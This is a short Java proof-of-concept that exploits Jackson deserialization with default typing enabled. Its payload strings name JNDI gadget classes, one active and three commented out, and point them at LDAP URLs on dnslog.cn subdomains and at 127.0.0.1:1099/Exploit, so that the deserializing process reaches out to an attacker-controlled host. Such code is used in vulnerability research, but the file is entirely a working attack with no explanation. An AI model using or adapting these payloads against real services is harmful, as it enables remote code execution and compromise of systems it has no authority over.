import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import javax.xml.ws.RequestWrapper;
import java.io.IOException;

public class Poc {

    public static void main(String[] args) throws IOException {

//"[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://b26wcf.dnslog.cn\",\"autoCommit\":\"true\"}]"
        String payload = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://b26wcf.dnslog.cn\",\"autoCommit\":\"true\"}]";
//        String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://makyo8.dnslog.cn\"}]";
//        String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1099/Exploit\"}]";
//        String payload = "[\"org.apache.commons.dbcp2.datasources.PerUserPoolDataSource\",{\"jndiLocation\":\"ldap://127.0.0.1:1099/Exploit\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
    }

}
